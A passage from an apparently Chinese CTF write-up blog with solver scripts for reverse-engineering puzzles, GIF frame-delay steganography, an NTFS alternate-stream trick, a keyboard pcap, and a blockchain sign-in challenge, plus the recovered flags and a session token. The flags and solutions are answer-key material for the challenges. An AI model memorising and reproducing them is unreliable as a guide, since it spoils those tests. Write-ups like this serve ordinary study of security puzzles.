class="hljs-string">&#x27;&#x27;&#x27;for i in range(len(box)):</span><br><span class="hljs-string">print(box[i],end=&#x27;&#x27;)&#x27;&#x27;&#x27;</span><br>magic=[<span class="hljs-number">0x6B</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x7E</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x4A</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x4A</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x6E</span>,<span class="hljs-number">0x6F</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x5D</span>,<span class="hljs-number">0x4B</span>,<span class="hljs-number">0x1E</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x1C</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0x4C</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x6A</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>]<br>buf1=<span class="hljs-string">&#x27;825914367671358924349672581186429735952763148437185692268537419714296853593841276&#x27;</span><br>buf2=<span class="hljs-string">&#x27;005004360000050024049670000106020030900700108030005090200507009704000800090040006&#x27;</span><br>buf3=<span class="hljs-string">&#x27;8291767138932581849755263447186268341129653538127&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(buf1)):<br>    <span class="hljs-keyword">if</span> buf1[i] !=buf2[i]:<br>        <span class="hljs-built_in">print</span>(buf1[i],end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-comment">#print(len(buf),len(magic))</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(buf3)):<br>    flag=<span class="hljs-built_in">ord</span>(buf3[k])^magic[k]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#flag=&#x27;moectf&#123;S0_As_I_prAy_Un1imited_B1ade_WOrks---E1m1ya_Shiro&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="FeatureExtraction-Litctf2025"><a href="#FeatureExtraction-Litctf2025" class="headerlink" title="FeatureExtraction-Litctf2025"></a><font style="color:rgb(48, 49, 51);">FeatureExtraction-</font><font style="color:rgb(77, 77, 77);">Litctf2025</font></h2><p><img src="/./img/0y4nWCBig3HdPZMW/1748482301251-90b681db-daac-4b45-814c-503ac2502e4e-060348.png" alt="1748482301251-90b681db-daac-4b45-814c-503ac2502e4e.png"></p><p>题目提示要特征提取，可能是动调提取44位密文</p><p>看加密函数</p><p><img src="/./img/0y4nWCBig3HdPZMW/1748483247730-c9cce732-284c-4fb2-877d-9034d3c357e9-095000.png" alt="1748483247730-c9cce732-284c-4fb2-877d-9034d3c357e9.png"></p><p>key</p><p><img src="/./img/0y4nWCBig3HdPZMW/1748483413217-2b54e9b3-3c6f-487c-875a-43ca42128435-223990.png" alt="1748483413217-2b54e9b3-3c6f-487c-875a-43ca42128435.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1748483476083-756616be-7ab2-46da-b162-f364d63405a1-526392.png" alt="1748483476083-756616be-7ab2-46da-b162-f364d63405a1.png"></p><p>下完断点后提取数据</p><p><img src="/./img/0y4nWCBig3HdPZMW/1748483683733-ed939bcf-8a63-4a84-8ec8-785bb78a7cfb-189864.png" alt="1748483683733-ed939bcf-8a63-4a84-8ec8-785bb78a7cfb.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1748483704369-9621be44-8c96-4237-97e9-4bb9978c539b-800612.png" alt="1748483704369-9621be44-8c96-4237-97e9-4bb9978c539b.png"></p><p>数据以dword形式提取出来</p><p><img src="/./img/0y4nWCBig3HdPZMW/1748484162961-a707b2c0-1bf8-4c34-a53d-d705f1709245-568757.png" alt="1748484162961-a707b2c0-1bf8-4c34-a53d-d705f1709245.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">key = [<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;LitCTF2025&quot;</span>]<br><br>a = [<br>    <span class="hljs-number">5776</span>, <span class="hljs-number">15960</span>, <span class="hljs-number">28657</span>, <span class="hljs-number">34544</span>, <span class="hljs-number">40294</span>, <span class="hljs-number">43824</span>, <span class="hljs-number">51825</span>, <span class="hljs-number">53033</span>, <span class="hljs-number">58165</span>, <span class="hljs-number">58514</span>,<br>    <span class="hljs-number">61949</span>, <span class="hljs-number">56960</span>, <span class="hljs-number">53448</span>, <span class="hljs-number">49717</span>, <span class="hljs-number">47541</span>, <span class="hljs-number">45519</span>, <span class="hljs-number">40607</span>, <span class="hljs-number">40582</span>, <span class="hljs-number">38580</span>, <span class="hljs-number">42320</span>,<br>    <span class="hljs-number">41171</span>, <span class="hljs-number">41269</span>, <span class="hljs-number">39370</span>, <span class="hljs-number">44224</span>, <span class="hljs-number">48760</span>, <span class="hljs-number">49558</span>, <span class="hljs-number">48128</span>, <span class="hljs-number">46531</span>, <span class="hljs-number">47088</span>, <span class="hljs-number">46181</span>,<br>    <span class="hljs-number">46707</span>, <span class="hljs-number">46879</span>, <span class="hljs-number">48098</span>, <span class="hljs-number">52047</span>, <span class="hljs-number">53933</span>, <span class="hljs-number">56864</span>, <span class="hljs-number">60564</span>, <span class="hljs-number">64560</span>, <span class="hljs-number">66744</span>, <span class="hljs-number">63214</span>,<br>    <span class="hljs-number">60873</span>, <span class="hljs-number">58245</span>, <span class="hljs-number">55179</span>, <span class="hljs-number">56857</span>, <span class="hljs-number">51532</span>, <span class="hljs-number">44308</span>, <span class="hljs-number">32392</span>, <span class="hljs-number">27577</span>, <span class="hljs-number">19654</span>, <span class="hljs-number">14342</span>,<br>    <span class="hljs-number">11721</span>, <span class="hljs-number">9112</span>, <span class="hljs-number">6625</span><br>]<br><br>b = [<span class="hljs-number">0</span>] * <span class="hljs-number">44</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">44</span>):<br>    s = a[k]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">min</span>(<span class="hljs-number">10</span>, k + <span class="hljs-number">1</span>)):<br>        s -= b[k - j] * key[j]<br>    <span class="hljs-keyword">if</span> s % key[<span class="hljs-number">0</span>] != <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid division at k =&quot;</span>, k)<br>    b[k] = s // key[<span class="hljs-number">0</span>]<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> b:<br>    flag += <span class="hljs-built_in">chr</span>(x)<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="harre-鸿蒙逆向了解"><a href="#harre-鸿蒙逆向了解" class="headerlink" title="harre-鸿蒙逆向了解"></a>harre-鸿蒙逆向了解</h2><p><font style="color:rgb(0, 0, 0);">主要还是熟悉这个hap怎么逆向的</font></p><p><font style="color:rgb(0, 0, 0);">进去后直接就看到一个base64变表加密</font></p><p><img src="/./img/0y4nWCBig3HdPZMW/1747036391551-833e913b-1e3a-4554-afd8-edaadb09221e-030896.png" alt="1747036391551-833e913b-1e3a-4554-afd8-edaadb09221e.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1747036402437-f6099d0d-c0b1-4744-9b67-e4a8c0bc4891-513813.png" alt="1747036402437-f6099d0d-c0b1-4744-9b67-e4a8c0bc4891.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1747036261199-f5e1e789-eb78-4835-be0f-3a1b09eae051-319029.png" alt="1747036261199-f5e1e789-eb78-4835-be0f-3a1b09eae051.png"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><blockquote><p>更新: 2025-06-04 14:44:46<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/obrhrc6cgz6o1liq">https://www.yuque.com/chaye-apqbl/vsc85q/obrhrc6cgz6o1liq</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2025/%E6%A0%A1%E8%B5%9B/"/>
    <url>/2026/01/19/WP/2025/%E6%A0%A1%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="校赛"><a href="#校赛" class="headerlink" title="校赛"></a>校赛</h1><h1 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>帧率提取 汉信码 base加密 ascii85加密 寄生文件</p><p>区块链</p><p>摩斯音频提取 pyc隐写</p><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><p>ios逆向，将ipa改后缀解压，反汇编</p><p>安卓逆向</p><p>rc4，base64魔改</p><p>upx特征码修改</p><p>z3</p><p>鸿蒙逆向 har解包 然后去专门的反汇编</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="迷宫"><a href="#迷宫" class="headerlink" title="迷宫"></a>迷宫</h2><p>一个个画出来即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x27;&#x27;&#x27;a=&#x27;2 2 3 2 1 2 2 2 2 2 2 3 2 1 2 3 3 3 3 4 4 3 3 4 3 3 2 3 3 4 1 4 1&#x27;<br>for i in range(len(a)):<br>    if(a[i]==&#x27; &#x27;):<br>        continue<br>    elif(a[i]==&#x27;1&#x27;):<br>        print(&quot;上&quot;,end=&#x27;&#x27;)<br>    elif (a[i] == &#x27;2&#x27;):<br>        print(&quot;右&quot;,end=&#x27;&#x27;)<br>    elif (a[i] == &#x27;3&#x27;):<br>        print(&quot;下&quot;,end=&#x27;&#x27;)<br>    elif (a[i] == &#x27;4&#x27;):<br>        print(&quot;左&quot;,end=&#x27;&#x27;)&#x27;&#x27;&#x27;<br>a=&#x27;flag   &#123; W o w _ t  h i s   _ 1s _ a N _ A m a z 1   i   ng  _  Ma2e&#125;&#x27;<br>for i in range(len(a)):<br>    if(a[i]!=&#x27; &#x27;):<br>        print(a[i],end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h2 id="what-can-i-say"><a href="#what-can-i-say" class="headerlink" title="what can i say"></a>what can i say</h2><p>给了一个gif文件，看了1000张照片后发现所有照片没有异常，换个方向</p><p>gif帧数间隔隐写（江哥笔记立大功）有事没事多看看我江哥笔记好吗</p><p>kali下使用</p><p><code>**identify -format &quot;%s %T \n&quot; flag.gif &gt; 1.txt**</code></p><p><code>**identify -format &quot;%T \n&quot; flag.gif &gt; 1.txt**</code></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">identify -format &quot;%T \n&quot; attachment.gif &gt; 2.txt<br></code></pre></td></tr></table></figure><p><img src="/./img/g_5G5hK2cxX3dqC2/1747125334728-9488e4b7-a666-499a-ad7f-467d3ce84f29-691619.png" alt="1747125334728-9488e4b7-a666-499a-ad7f-467d3ce84f29.png"></p><p>得到asill码，然后转换一下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># 文件名：ascii<span class="hljs-emphasis">_converter.py</span></span><br><span class="hljs-emphasis"><span class="hljs-section"></span></span><br><span class="hljs-emphasis"><span class="hljs-section">def text_</span>to<span class="hljs-emphasis">_ascii(input_</span>path, output<span class="hljs-emphasis">_path):</span></span><br><span class="hljs-emphasis"><span class="hljs-section">    &quot;&quot;&quot;</span></span><br><span class="hljs-emphasis"><span class="hljs-section">    将文本文件内容转换为 ASCII 码并写入输出文件（不换行）。</span></span><br><span class="hljs-emphasis"><span class="hljs-section">    &quot;&quot;&quot;</span></span><br><span class="hljs-emphasis"><span class="hljs-section">    try:</span></span><br><span class="hljs-emphasis"><span class="hljs-section">        with open(input_</span>path, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as infile, \</span><br><span class="hljs-code">                open(output_path, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as outfile:</span><br><span class="hljs-code"></span><br><span class="hljs-code">            all_ascii = []</span><br><span class="hljs-code">            for line in infile:</span><br><span class="hljs-code">                line = line.rstrip(&#x27;\n&#x27;)</span><br><span class="hljs-code">                ascii_values = [str(ord(char)) for char in line]</span><br><span class="hljs-code">                all_ascii.extend(ascii_values)</span><br><span class="hljs-code"></span><br><span class="hljs-code">            outfile.write(&#x27; &#x27;.join(all_ascii))</span><br><span class="hljs-code">            print(f&quot;[成功] 文本转 ASCII 已写入 &#123;output_path&#125;&quot;)</span><br><span class="hljs-code">    except FileNotFoundError:</span><br><span class="hljs-code">        print(f&quot;[错误] 输入文件未找到: &#123;input_path&#125;&quot;)</span><br><span class="hljs-code">    except Exception as e:</span><br><span class="hljs-code">        print(f&quot;[错误] 转换失败: &#123;e&#125;&quot;)</span><br><span class="hljs-code"></span><br><br>def ascii<span class="hljs-emphasis">_to_</span>text(input<span class="hljs-emphasis">_path, output_</span>path):<br><span class="hljs-code">    &quot;&quot;&quot;</span><br><span class="hljs-code">    将 ASCII 文件内容转换为文本并写入输出文件（不换行）。</span><br><span class="hljs-code">    &quot;&quot;&quot;</span><br><span class="hljs-code">    try:</span><br><span class="hljs-code">        with open(input_path, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as infile, \</span><br><span class="hljs-code">                open(output_path, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as outfile:</span><br><span class="hljs-code"></span><br><span class="hljs-code">            content = infile.read().replace(&#x27;,&#x27;, &#x27; &#x27;)</span><br><span class="hljs-code">            ascii_values = content.strip().split()</span><br><span class="hljs-code">            try:</span><br><span class="hljs-code">                chars = [chr(int(code)) for code in ascii_values]</span><br><span class="hljs-code">                outfile.write(&#x27;&#x27;.join(chars))</span><br><span class="hljs-code">                print(f&quot;[成功] ASCII 转文本已写入 &#123;output_path&#125;&quot;)</span><br><span class="hljs-code">            except ValueError:</span><br><span class="hljs-code">                print(&quot;[错误] 文件中包含非数字内容，转换失败。&quot;)</span><br><span class="hljs-code">    except FileNotFoundError:</span><br><span class="hljs-code">        print(f&quot;[错误] 输入文件未找到: &#123;input_path&#125;&quot;)</span><br><span class="hljs-code">    except Exception as e:</span><br><span class="hljs-code">        print(f&quot;[错误] 转换失败: &#123;e&#125;&quot;)</span><br><span class="hljs-code"></span><br><br>if <span class="hljs-strong">__name__</span> == &quot;<span class="hljs-strong">__main__</span>&quot;:<br><span class="hljs-code">    # 示例使用</span><br><span class="hljs-code">    # 将文本转为 ASCII（写入 ascii_output.txt）</span><br><span class="hljs-code">   # text_to_ascii(&#x27;2.txt&#x27;, &#x27;ascii_output.txt&#x27;)</span><br><span class="hljs-code"></span><br><span class="hljs-code">    # 将 ASCII 转为文本（写入 text_output.txt）</span><br><span class="hljs-code">    ascii_to_text(&#x27;2.txt&#x27;, &#x27;text_output.txt&#x27;)</span><br><span class="hljs-code"></span><br></code></pre></td></tr></table></figure><p>得到经过多层base加密的密文</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">7OkS]MY9bjSC&#x27;\]e<span class="language-xml">&lt;s\zPl)Xs2pNm=6C/hu)IfXt:X^]%Rm$:A[y]<span class="hljs-tag">&lt;<span class="hljs-name">W</span>&gt;</span></span>gPlF+HjM/0[ty&gt;a|y,O8)w^962h,<span class="hljs-emphasis">*a,gJHFdkm+1JsQnsD(h44QDBL0d;Dh\mu+B.kq8&amp;qL[&lt;,%R&#x27;z[t(qGIUBr3.l2BvR[tDqMcR|&lt;67pH5:EY8#&#x27;Kb=ZDJ<span class="language-xml">&lt;qF[7][s?U[.&#x27;&#125;lk&lt;0t,fp_jUS&lt;sjH650/1kiq)(bMUTW&#125;u[J.;7</span></span><br></code></pre></td></tr></table></figure><p>一把梭</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1746947036499-60e57351-8c49-4581-9fd3-dfc533714e92-770090.png" alt="1746947036499-60e57351-8c49-4581-9fd3-dfc533714e92.png"></p><p>key :Th1s_i5_P@sSVV0rd_f0r_Z1p</p><p>可恶 这是个汉信码</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1746949495259-f07ea056-e546-40f3-a706-e149ee9485ae-812519.png" alt="1746949495259-f07ea056-e546-40f3-a706-e149ee9485ae.png"></p><p><a href="https://tuzim.net/hxdecode/">https://tuzim.net/hxdecode/</a></p><p><img src="/./img/g_5G5hK2cxX3dqC2/1746949519365-9fa47b7c-93c1-4fe5-b5e4-8271175acf28-633684.png" alt="1746949519365-9fa47b7c-93c1-4fe5-b5e4-8271175acf28.png"></p><p><font style="color:rgba(0, 0, 0, 0.85);">听说好像有什么东西被寄生了，而且是同名的</font></p><p><font style="color:rgba(0, 0, 0, 0.85);">mspaint flag.png:flag.txt   (nt)</font></p><p><font style="color:rgba(0, 0, 0, 0.85);">到这里发现没报错 然后用文本读取</font></p><p><font style="color:rgba(0, 0, 0, 0.85);">notepad flag.png:flag.txt</font></p><p><font style="color:rgba(0, 0, 0, 0.85);"></font></p><h2 id="chain"><a href="#chain" class="headerlink" title="chain"></a>chain</h2><p>题目(提供源码，nc访问) 43.162.126.171:20000</p><p>rpc(货币节点，添加至metamask) 43.162.126.171:8545</p><p>水龙头(提供货币，浏览器访问) 43.162.126.171:8080</p><p>Can you make the isSolved() function return true?</p><p>[1] - Create an account which will be used to deploy the challenge contract</p><p>[2] - Deploy the challenge contract using your generated account</p><p>[3] - Get your flag once you meet the requirement</p><p>[4] - Show the contract source code</p><p>[-] input your choice: 1</p><p>[+] deployer account: 0x508d6694605E94D5F5Cd83927D1430dF88a72454</p><p>[+] token: v4.local.zKilVTo3F9RnfxyFFcMtmKcQooisTzmINMREDPWC2-LFBA6mXK-RDOJGLdGYZowa7OcK6fEa3sJxJRcovorbbC4f3JbEdSAZ8SI3wKqocvNpHHG6asfPKTzbS8uqz1MdQAdKMp58BVcQHTjvx83Go4LUXLC0KsSpxafT52TJkSbr7A.R3JlZXRlcg</p><p>[+] please transfer more than 0.002 test ether to the deployer account for next step</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1746941734386-eaf3e2f0-a251-4ff3-abb7-19894e4ce3db-709102.png" alt="1746941734386-eaf3e2f0-a251-4ff3-abb7-19894e4ce3db.png"></p><p><font style="color:rgb(196, 198, 201);background-color:rgb(37, 45, 56);">给了我们交易地址和交易hash</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1746941796637-75e92d85-d9ef-44f9-9236-093c276d5ee9.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plain">源码<br>[-] input your choice: 4<br>contracts/Example.sol<br>// SPDX-License-Identifier: UNLICENSED<br>pragma solidity 0.8.9;<br><br>contract Greeter &#123;<br>    string greeting;<br><br>    constructor(string memory _greeting) &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function greet() public view returns (string memory) &#123;<br>        return greeting;<br>    &#125;<br><br>    function setGreeting(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function isSolved() public view returns (bool) &#123;<br>        string memory expected = &quot;EasyMiscSignin&quot;;<br>        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>   function isSolved() public view returns (bool) {</p><pre><code class="hljs">    string memory expected = &quot;EasyMiscSignin&quot;;    return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));&#125;</code></pre><p>可以看到我们需要满足keccak256(abi.encodePacked(expected)) &#x3D;&#x3D; keccak256(abi.encodePacked(greeting));但expexted已经是EasyMiscSignin，所以我们需要让greeting也是EasyMiscSignin</p><p>添加rpc</p><p><a href="http://43.162.126.171:8545/">http://43.162.126.171:8545</a></p><p>添加网络，其中网络名称随便写，rpc填题目的第二个rpc地址，链id填错会告诉你正确的，照着填就行，货币符号自己随便。</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1746943232585-0a827c21-0a99-4db2-8ab9-ba6cafda8d4f-225443.png" alt="1746943232585-0a827c21-0a99-4db2-8ab9-ba6cafda8d4f.png"></p><p>在浏览器搜索remix并打开 复制源码进去</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1746943598796-70ef4313-199a-434c-aed8-4fa7e7379275-221396.png" alt="1746943598796-70ef4313-199a-434c-aed8-4fa7e7379275.png"></p><p>contract address: 0xA6fAaF82611e37383b64a1580F84fEDD38eb5BD4</p><p>[+] transaction hash: 0x06a64470718b514cd5b21819c31ab7f125102a4186e114e4c5bfe0b1bf75fe7f</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1746944085243-1072529e-e5a3-4ce5-97c2-730034925144-676027.png" alt="1746944085243-1072529e-e5a3-4ce5-97c2-730034925144.png"></p><p>然后选择Injected Provider - MetaMask，这边注意networks的id是否一样，然后在At Address中输入前面的合约地址：0xA6fAaF82611e37383b64a1580F84fEDD38eb5BD4</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1746944228626-99835d46-c8e8-426d-9fcf-fba1c1751986-025260.png" alt="1746944228626-99835d46-c8e8-426d-9fcf-fba1c1751986.png"></p><p>下面填EasyMiscSignin</p><p>然后点击setGreeting</p><p>提示我们钱包里面没有gas fee 所以给钱包地址充钱</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1746945614274-35d34f94-71b0-4954-afca-e91d6ec24d66-402520.png" alt="1746945614274-35d34f94-71b0-4954-afca-e91d6ec24d66.png"></p><p><img src="/./img/g_5G5hK2cxX3dqC2/1746946002834-43904793-490a-4b35-a153-0b82e2ca8a6b-995634.png" alt="1746946002834-43904793-490a-4b35-a153-0b82e2ca8a6b.png"></p><p>然后发送之前账号的token</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1746946060655-03ceaa5e-b5f3-40d2-a31e-dafbed4a12d6-719250.png" alt="1746946060655-03ceaa5e-b5f3-40d2-a31e-dafbed4a12d6.png"></p><p>flag{72ada6f4-ae2e-4239-b37c-99cf760753c5}</p><h2 id="四杀（keyboard）"><a href="#四杀（keyboard）" class="headerlink" title="四杀（keyboard）"></a>四杀（keyboard）</h2><p>python  .\main.py .\keyboard.pcapng</p><p><img src="/./img/g_5G5hK2cxX3dqC2/1747116024696-4ffb8a67-268e-4609-804e-ff4a8db3db25-432710.png" alt="1747116024696-4ffb8a67-268e-4609-804e-ff4a8db3db25.png"></p><p>║ 2.1.1 &#x3D;&gt; Host                                                                                                        ║</p><p>║ baaaaaaaacaaaaacaab     </p><p><img src="/./img/g_5G5hK2cxX3dqC2/1747116056311-fc3ccb44-cf9f-4704-9610-92a77b8fb404-016349.png" alt="1747116056311-fc3ccb44-cf9f-4704-9610-92a77b8fb404.png"><br>  <a href="https://www.yuque.com/qetxjul27/wn9kli/vys765odvcxlihim?single%5BCAPSLOCK%5Dd%5BCAPSLOCK%5Doc">https://www.yuque.com/qetxjul27/wn9kli/vys765odvcxlihim?single[CAPSLOCK]d[CAPSLOCK]oc</a> </p><p><img src="/./img/g_5G5hK2cxX3dqC2/1747116085558-87955479-8f79-4769-a611-5ac31e012d1f-435734.png" alt="1747116085558-87955479-8f79-4769-a611-5ac31e012d1f.png"></p><p>先复制一下数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">330D0D0A8BD11868BB020000E300000000000000000000000002000000400000007336000000640064016C006D015A010100640064026C025A026403640484005A036405640684005A04650564076B027232650483000100640253002908E900000000A901DA034145534E63020000000000000005000000030000004300000073480000007C00640117317D027C026A00640283017D027C026A016403640483027D0274026A037C0274026A0483027D0374056A067C0183017D017C036A077C0183016A0883007D047C04534029054EDA0A71657478736F636F6F6CFA057574662D38E918000000F301000000412909DA06656E636F6465DA05726A7573747203000000DA036E6577DA084D4F44455F454342DA0862696E6173636969DA09756E6865786C696679DA0764656372797074DA066465636F64652905DA0178DA06636970686572DA036B6579DA03616573DA04666C6167A9007215000000FA1A2F686F6D652F6B616C692F4465736B746F702F666C61672E7079720E00000004000000F30E000000000108010A010C010E010A010E01720E000000630000000000000000030000000300000043000000733C00000064017D007400640283017D0174017C017C0083027D0274027C028301016864037C026B06723074026404830101756E0874026405830101546400537929064EDA60626536666236626162663739326362626633343838336139333536626637333735376339326138333465666162346264633139366634343736633637313563343965666430626331306234363364393463353032303435646533353063323637FA17506C6561736520696E70757420796F7572206B65793A207214000000FA13576F772C20796F752066696E64206974212121FA084F68206E6F2121212903DA05696E707574720E000000DA057072696E742903DA0163DA016B7214000000721500000072150000007216000000DA046D61696E10000000F30E0000000001040108010A01080108010A027220000000DA085F5F6D61696E5F5F2906DA0D43727970746F2E4369706865727203000000720C000000720E0000007220000000DA085F5F6E616D655F5F721<br></code></pre></td></tr></table></figure><p>听视频发现是莫斯电报，那把音频轨道分离出来然后在线解谜一下</p><p><a href="https://dimorse.com/zh/morse-code-audio-decoder/">https://dimorse.com/zh/morse-code-audio-decoder/</a></p><p><img src="/./img/g_5G5hK2cxX3dqC2/1747118509045-0d820e5c-e6fb-44e9-87dd-d05bfd2fc76c-700917.png" 